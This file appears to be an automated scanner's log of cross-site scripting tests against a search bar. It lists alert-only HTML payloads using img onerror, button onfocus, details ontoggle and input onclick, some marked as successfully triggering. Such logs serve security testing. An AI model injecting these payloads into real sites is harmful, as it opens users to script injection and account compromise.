# Working XSS Payloads - 2025-07-22 19:25:37.599732
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
# Working XSS Payloads - 2025-07-22 19:26:22.503043
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
# Working XSS Payloads - 2025-07-22 19:27:07.452376
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
# Working XSS Payloads - 2025-07-22 19:27:46.307846
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
# Working XSS Payloads - 2025-07-22 19:28:37.774901
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
# Working XSS Payloads - 2025-07-22 19:29:24.719527
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
# Working XSS Payloads - 2025-07-22 19:30:09.524799
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
# Working XSS Payloads - 2025-07-22 19:30:47.569764
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
# Working XSS Payloads - 2025-07-22 19:31:39.580882
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
# Working XSS Payloads - 2025-07-22 19:34:07.075079
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
><details open ontoggle=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
><input onclick=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (click simulation) | search_bar
>><img src=x onerror=alert(1)> | Alert expected | Alert triggered: 1 | Successful XSS in search_bar (immediate handle) | search_bar
# Working XSS Payloads - 2025-07-22 19:35:03.383368
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
%3E%3Cimg src=x onerror=alert(fGQrx)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
%3Cbutton onfocus=alert(bWcMw)%3E | Alert expected | Payload injected (no alert) | Successful XSS detected via DOM inspection | search_bar
